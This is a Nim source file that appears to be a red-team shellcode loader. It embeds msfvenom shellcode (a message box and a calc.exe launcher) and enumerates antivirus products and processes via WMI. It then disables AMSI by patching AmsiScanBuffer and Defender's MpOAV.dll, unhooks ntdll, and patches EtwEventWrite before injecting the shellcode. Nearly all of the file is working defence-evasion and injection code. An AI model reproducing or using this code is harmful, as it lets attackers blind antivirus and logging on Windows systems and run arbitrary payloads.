import execution
import winim
import winim/com
import osproc

when isMainModule:
  when defined(PAYLOAD_MSGBOX):
    # msfvenom -p windows/x64/messagebox -e x64/xor_dynamic -f csharp
    echo "[PAYLOAD] Using MSF Message Box Payload"
    var shellcode: array[345, byte] = [
    byte 0xeb,0x27,0x5b,0x53,0x5f,0xb0,0xbb,0xfc,0xae,0x75,0xfd,0x57,0x59,0x53,0x5e,
    0x8a,0x06,0x30,0x07,0x48,0xff,0xc7,0x48,0xff,0xc6,0x66,0x81,0x3f,0xf1,0xf9,
    0x74,0x07,0x80,0x3e,0xbb,0x75,0xea,0xeb,0xe6,0xff,0xe1,0xe8,0xd4,0xff,0xff,
    0xff,0x10,0xbb,0xec,0x58,0x91,0xf4,0xe0,0xef,0xef,0xef,0xf8,0xc0,0x10,0x10,
    0x10,0x51,0x41,0x51,0x40,0x42,0x41,0x46,0x58,0x21,0xc2,0x75,0x58,0x9b,0x42,
    0x70,0x2e,0x58,0x9b,0x42,0x08,0x2e,0x58,0x9b,0x42,0x30,0x2e,0x58,0x9b,0x62,
    0x40,0x2e,0x58,0x1f,0xa7,0x5a,0x5a,0x5d,0x21,0xd9,0x58,0x21,0xd0,0xbc,0x2c,
    0x71,0x6c,0x12,0x3c,0x30,0x51,0xd1,0xd9,0x1d,0x51,0x11,0xd1,0xf2,0xfd,0x42,
    0x51,0x41,0x2e,0x58,0x9b,0x42,0x30,0x2e,0x9b,0x52,0x2c,0x58,0x11,0xc0,0x2e,
    0x9b,0x90,0x98,0x10,0x10,0x10,0x58,0x95,0xd0,0x64,0x7f,0x58,0x11,0xc0,0x40,
    0x2e,0x9b,0x58,0x08,0x2e,0x54,0x9b,0x50,0x30,0x59,0x11,0xc0,0xf3,0x4c,0x58,
    0xef,0xd9,0x2e,0x51,0x9b,0x24,0x98,0x58,0x11,0xc6,0x5d,0x21,0xd9,0x58,0x21,
    0xd0,0xbc,0x51,0xd1,0xd9,0x1d,0x51,0x11,0xd1,0x28,0xf0,0x65,0xe1,0x2e,0x5c,
    0x13,0x5c,0x34,0x18,0x55,0x29,0xc1,0x65,0xc6,0x48,0x2e,0x54,0x9b,0x50,0x34,
    0x59,0x11,0xc0,0x76,0x2e,0x51,0x9b,0x1c,0x58,0x2e,0x54,0x9b,0x50,0x0c,0x59,
    0x11,0xc0,0x2e,0x51,0x9b,0x14,0x98,0x58,0x11,0xc0,0x51,0x48,0x51,0x48,0x4e,
    0x49,0x4a,0x51,0x48,0x51,0x49,0x51,0x4a,0x58,0x93,0xfc,0x30,0x51,0x42,0xef,
    0xf0,0x48,0x51,0x49,0x4a,0x2e,0x58,0x9b,0x02,0xf9,0x59,0xef,0xef,0xef,0x4d,
    0x59,0xd7,0xd1,0x10,0x10,0x10,0x10,0x2e,0x58,0x9d,0x85,0xee,0x10,0x10,0x10,
    0x2e,0x5c,0x9d,0x95,0x1f,0x11,0x10,0x10,0x58,0x21,0xd9,0x51,0xaa,0x55,0x93,
    0x46,0x17,0xef,0xc5,0x58,0x21,0xd9,0x51,0xaa,0xe0,0xa5,0xb2,0x46,0xef,0xc5,
    0x58,0x75,0x7c,0x7c,0x7f,0x3c,0x30,0x76,0x62,0x7f,0x7d,0x30,0x5d,0x43,0x56,
    0x31,0x10,0x5d,0x75,0x63,0x63,0x71,0x77,0x75,0x52,0x7f,0x68,0x10,0xf1,0xf9]


  when defined(PAYLOAD_CALC):
      # msfvenom -p windows/x64/exec -f csharp CMD="calc.exe" modified for Nim arrays
      echo "[PAYLOAD] Using Calc.exe Payload"
      var shellcode: array[276, byte] = [
      byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
      0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
      0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
      0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
      0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
      0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
      0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
      0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
      0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
      0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
      0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
      0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
      0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
      0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
      0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
      0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
      0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
      0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
      0x63,0x2e,0x65,0x78,0x65,0x00]  

  when defined(LIST_AV):
    echo "[LIST AV]"
    var
      wmi = GetObject(r"winmgmts:{impersonationLevel=impersonate}!\\.\root\securitycenter2")
    for i in wmi.execQuery("SELECT displayName FROM AntiVirusProduct"):
        echo "  AntiVirusProduct: ", i.displayName
    
    echo "Getting processes"
    wmi = GetObject(r"winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
    for i in wmi.execQuery("select * from win32_process"):
      echo i.handle, ", ", i.name

  when defined(PATCH_AMSI):
    import strformat
    import dynlib

    proc PatchAmsi(): bool =
        when defined amd64:
            echo "[AMSI PATCH] Running in x64 process"
            const amsiPatch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
        elif defined i386:
            echo "[AMSI PATCH] Running in x86 process"
            const amsiPatch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
        var
            amsi: LibHandle
            cs: pointer
            op: DWORD
            t: DWORD
            disabled: bool = false

        # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
        # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
        amsi = loadLib("amsi")
        if isNil(amsi):
            echo "[AMSI PATCH] Failed to load amsi.dll"
            return disabled

        cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
        if isNil(cs):
            echo "[AMSI PATCH] Failed to get the address of 'AmsiScanBuffer'"
            return disabled

        if VirtualProtect(cs, amsiPatch.len, 0x40, addr op):
            echo "[AMSI PATCH] Applying patch"
            copyMem(cs, unsafeAddr amsiPatch, amsiPatch.len)
            VirtualProtect(cs, amsiPatch.len, op, addr t)
            disabled = true

        return disabled

    var amsiSuccess = PatchAmsi()
    echo fmt"[AMSI PATCH] AMSI disabled: {bool(amsiSuccess)}"

  else:
    when defined(PATCH_AMSIPROVIDOR):
      import strformat
      import dynlib
      import os, sequtils

      when defined amd64:
          echo "[AMSI PROVIDOR PATCH] Running in x64 process"
          const amsiPatch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
      elif defined i386:
          echo "[AMSI PROVIDOR PATCH] Running in x86 process"
          const amsiPatch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

      proc PatchAmsi(): bool =
          var
              amsi: HMODULE
              cs: pointer
              op: DWORD
              t: DWORD
              disabled: bool = false
      
          let filesInPath = toSeq(walkDir("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\", relative=true))
          var length = len(filesInPath)
          # last dir == newest dir
          amsi = LoadLibrary(fmt"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\{filesInPath[length-1].path}\\MpOAV.dll")
          if amsi == 0:
              echo "[AMSI PROVIDOR PATCH] Failed to load MpOav.dll"
              return disabled
          cs = GetProcAddress(amsi,"DllGetClassObject")
          if cs == nil:
              echo "[AMSI PROVIDOR PATCH] Failed to get the address of 'DllGetClassObject'"
              return disabled

          if VirtualProtect(cs, amsiPatch.len, 0x40, addr op):
              echo "[AMSI PROVIDOR PATCH] Applying patch"
              copyMem(cs, unsafeAddr amsiPatch, amsiPatch.len)
              VirtualProtect(cs, amsiPatch.len, op, addr t)
              disabled = true

          return disabled

      var amsiSuccess = PatchAmsi()
      echo fmt"[AMSI PROVIDOR PATCH] AMSI disabled: {bool(amsiSuccess)}"


  when defined(UNHOOK_NTDLL):
    import strutils
    import ptr_math
    import strformat

    proc toString(bytes: openarray[byte]): string =
      result = newString(bytes.len)
      copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

    proc ntdllunhook(): bool =
      let low: uint16 = 0
      var 
          processH = GetCurrentProcess()
          mi : MODULEINFO
          ntdllModule = GetModuleHandleA("ntdll.dll")
          ntdllBase : LPVOID
          ntdllFile : FileHandle
          ntdllMapping : HANDLE
          ntdllMappingAddress : LPVOID
          hookedDosHeader : PIMAGE_DOS_HEADER
          hookedNtHeader : PIMAGE_NT_HEADERS
          hookedSectionHeader : PIMAGE_SECTION_HEADER

      GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
      ntdllBase = mi.lpBaseOfDll
      ntdllFile = getOsFileHandle(open("C:\\windows\\system32\\ntdll.dll",fmRead))
      ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
      if ntdllMapping == 0:
        echo fmt"[UNHOOK NTDLL] Could not create file mapping object ({GetLastError()})."
        return false
      ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
      if ntdllMappingAddress.isNil:
        echo fmt"[UNHOOK NTDLL] Could not map view of file ({GetLastError()})."
        return false
      hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
      hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
      for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
          hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
          if ".text" in toString(hookedSectionHeader.Name):
              var oldProtection : DWORD = 0
              if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) == 0:#0x40 = PAGE_EXECUTE_READWRITE
                echo fmt"[UNHOOK NTDLL] Failed calling VirtualProtect ({GetLastError()})."
                return false
              copyMem(ntdllBase + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
              if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) == 0:
                echo fmt"[UNHOOK NTDLL] Failed resetting memory back to it's orignal protections ({GetLastError()})."
                return false  
      CloseHandle(processH)
      CloseHandle(ntdllFile)
      CloseHandle(ntdllMapping)
      FreeLibrary(ntdllModule)
      return true
              

    var ntdllResult = ntdllunhook()
    echo fmt"[UNHOOK NTDLL] SUCCESS: {bool(ntdllResult)}"

  when defined(PATCH_ETW):
    import strformat
    import dynlib

    when defined amd64:
        echo "[ETW PATCH] Running in x64 process"
        const etwPatch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        echo "[ETW PATCH] Running in x86 process"
        const etwPatch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]

    proc Patchntdll(): bool =
        var
            ntdll: LibHandle
            cs: pointer
            op: DWORD
            t: DWORD
            disabled: bool = false

        # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
        # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
        ntdll = loadLib("ntdll")
        if isNil(ntdll):
            echo "[ETW PATCH] Failed to load ntdll.dll"
            return disabled

        cs = ntdll.symAddr("EtwEventWrite") # equivalent of GetProcAddress()
        if isNil(cs):
            echo "[ETW PATCH] Failed to get the address of 'EtwEventWrite'"
            return disabled

        if VirtualProtect(cs, etwPatch.len, 0x40, addr op):
            echo "[ETW PATCH] Applying patch"
            copyMem(cs, unsafeAddr etwPatch, etwPatch.len)
            VirtualProtect(cs, etwPatch.len, op, addr t)
            disabled = true

        return disabled

    var etwSuccess = Patchntdll()
    echo fmt"[ETW PATCH] ETW blocked by patch: {bool(etwSuccess)}"

  inject(shellcode)